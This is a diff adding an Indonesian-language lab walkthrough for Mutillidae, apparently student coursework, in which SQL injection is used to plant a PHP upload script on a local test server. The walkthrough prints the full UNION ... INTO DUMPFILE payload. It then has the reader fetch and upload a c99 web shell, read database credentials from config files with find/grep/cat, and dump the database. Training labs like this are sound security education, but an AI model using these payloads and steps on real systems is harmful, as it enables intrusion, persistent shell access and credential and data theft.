@@ -469,4 +469,105 @@ echo "select * from nowasp.credit_cards;" | mysql -uroot -psamurai
 ![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m10_14.png)
 
 
-Referensi : http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/index.html
+Referensi : http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson10/index.html
+
+## Lesson 11 - SQL Injection Union Exploit #4 (Create PHP Upload Script)
+
+### Pre-Requisite
+
+1. Buka terminal dan masukkan perintah mkdir -p /root/backdoor.
+2. Buka Mozilla dan buka halaman: https://r57.gen.tr/, klik tombol Priv c99 Shell download.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_03.1.png)
+
+3. Simpan C99.zip pada /root/backdoor.
+4. Mount C99.zip, dan Copy C99.php dari hasil Archive Mount ke /root/backdoor
+
+### Langkah
+
+1. Masuk pada Mozilla, dan buka website : ttp://192.168.56.1/mutillidae.
+2. Kemudian buka OWASP Top 10 --> A1 - SQL Injection --> SQLi - Extract Data --> User Info.
+3. Klik kanan pada tombol View Accounts Details, klik inpect element.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_04.png)
+
+4. Ubah kalimat style="text-align:, dari center to left. Kemudian tutup firebug.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_06.png)
+
+5. Klik kanan pada tombol Name Textbox, klik inpect element.
+6. Ubah kalimat "size=", dari 20 menjadi 550. Kemudian tutup firebug.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_07.png)
+
+7. Pada Name Textbox inputkan kalimat berikut.  Ingat untuk memberikan spasi setelah simbol "--".
+<pre>' union select null,null,null,null,null,null,'<html><body><div><?php if(isset($_FILES["fupload"])) { $source = $_FILES["fupload"]["tmp_name"]; $target = $_FILES["fupload"]["name"]; move_uploaded_file($source,$target); system("chmod 777 $target"); $size = getImageSize($target); } ?></div><form enctype="multipart/form-data" action="<?php print $_SERVER["PHP_SELF"]?>" method="post"><p><input type="hidden" name="MAX_FILE_SIZE" value="500000"><input type="file" name="fupload"><br><input type="submit" name="upload!"><br></form></body></html>' INTO DUMPFILE '/var/www/html/mutillidae/upload_file.php' -- </pre>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_08.png)
+
+8. Error umum akan muncul bersamaan dengan hasil dari sql inject yang membuat file upload_file.php pada server.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_09.png)
+
+9. Buka halaman: http://192.168.56.1/mutillidae/upload_file.php
+10. Pilih Browse button, dan pilih file C99.php. Kemudian klik Submit Query.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_10.png)
+
+11. Buka halaman: http://192.168.56.1/mutillidae/C99.php
+12. Klik Sec.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_11.png)
+
+13. Inputkan pwd pada Enter dan klik Execute.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_12.png)
+
+14. Hasil dari perintah tersebut adalah direktori aktif dari web server, kemudian inputkan perintah:
+<pre>find /var/www/html/mutillidae -name "*.php" | xargs grep -i "password" | grep "="</pre>
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_13.png)
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_14.png)
+
+15. Dari hasil tersebut dapat terlihat file yang menyimpan informasi tentang database.
+16. Masukkan perintah:
+<pre>find /var/www/html/mutillidae -name "MySQLHandler.php" | xargs cat | sed 's/</\&#60;/g' | sed 's/>/\&#62;/g' /var/www/html/mutillidae/classes/MySQLHandler.php</pre>
+17. Akan didapatkan nilai dari Database username, password, dan nama.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_15.png)
+
+18. Klik SQL, kemudian masukkan data yang telah didapatkan dan klik Connect.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_16.png)
+
+19. Klik table accounts.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_17.png)
+
+20. Klik [Insert].
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_18.png)
+
+21. Isikan data yang ingin anda tambahkan dan klik Confirm.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_18.1.png)
+
+22. Klik Yes dan data ditambahkan, kemudian kembali pada halaman langkah 20.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_19.png)
+
+23. Klik [Dump]
+24. Isikan data sesuai keinginan dan klik 'Dump'.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_20.png)
+
+25. Simpan dump pada tempat yang anda inginkan.
+
+![](https://raw.githubusercontent.com/dns-148/PKSJ/master/Tugas%20Final/Mutillidae/Screenshot/m11_21.png)
+
+
+
+
+
+ 
